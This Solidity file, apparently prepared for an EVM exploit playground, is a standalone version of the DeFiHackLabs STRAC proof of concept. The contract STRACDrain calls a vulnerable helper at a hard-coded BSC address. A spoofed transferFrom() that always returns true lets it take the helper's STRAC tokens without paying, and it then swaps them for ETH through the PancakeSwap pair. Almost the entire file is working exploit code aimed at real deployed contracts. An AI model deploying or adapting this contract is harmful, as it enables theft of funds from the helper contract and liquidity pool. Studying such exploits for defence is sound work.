// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (docs/EVM-playground-2.md
// §3 "syntheticExploit"). The original DeFiHackLabs PoC (test/STRAC_exp.sol)
// runs the whole attack INLINE in the Foundry `ContractTest` contract
// (`attacker = address(this)`), including a fake `transferFrom()` the test
// contract itself implements to spoof the vulnerable helper's "pull" leg.
// There is no standalone exploit contract to deploy in the original test, so
// this file faithfully copies the inline attack (constants, call sequence,
// the spoofed transferFrom, and the TOKENToETH sell leg) into a standalone
// contract with a `run()` entrypoint, with minimal inline interfaces (no
// imports) so it compiles anywhere.

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IPancakeRouter {
    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)
        external
        pure
        returns (uint256 amountOut);
}

contract STRACDrain {
    IERC20 STRAC = IERC20(0x9801DA0AA142749295692c7cb3241E4EE2B80Bda);
    IERC20 ETH = IERC20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);
    IPancakePair ETH_STRAC_LpPool = IPancakePair(0x2976bD3774622367CE7A575D28201480e640966F);
    IPancakeRouter PancakeRouter = IPancakeRouter(payable(0x3870D09F59564d8b86B052b1FB1e27b961f9BC73));
    address Contract_0x1f90 = 0x1F90BDeB5674833868EE9b36707B929024E7A513;

    // Entrypoint — copies testExploit() verbatim (minus the vm.* logging
    // cheatcodes, which don't exist outside Foundry's test harness).
    function run() external {
        STRAC.approve(address(PancakeRouter), type(uint256).max);
        Contract_0x1f90.call(
            abi.encodeWithSelector(bytes4(0x4a75084c), address(this), STRAC, STRAC.balanceOf(address(Contract_0x1f90)))
        );
        TOKENToETH();
    }

    // The exploit's spoofed "pull" leg: the vulnerable helper calls
    // transferFrom() ON the attacker-supplied `recipient` (this contract) to
    // validate that the caller "paid" for the STRAC it is about to hand out.
    // By making `recipient == address(this)`, the attacker controls this
    // function and simply stubs it to return true without moving any tokens.
    function transferFrom(address sender, address recipient, uint256 amount) external pure returns (bool) {
        return true;
    }

    function TOKENToETH() internal {
        (uint256 reserveETH, uint256 reserveTOKEN,) = ETH_STRAC_LpPool.getReserves();
        uint256 amountOut;

        (uint256 reserveETH_after, uint256 reserveTOKEN_after,) = ETH_STRAC_LpPool.getReserves();

        amountOut = PancakeRouter.getAmountOut(STRAC.balanceOf(address(this)), reserveTOKEN, reserveETH);
        STRAC.transfer(address(ETH_STRAC_LpPool), STRAC.balanceOf(address(this)));
        ETH_STRAC_LpPool.swap(amountOut * 997 / 1000, 0, address(this), "");
    }

    fallback() external payable {}
    receive() external payable {}
}
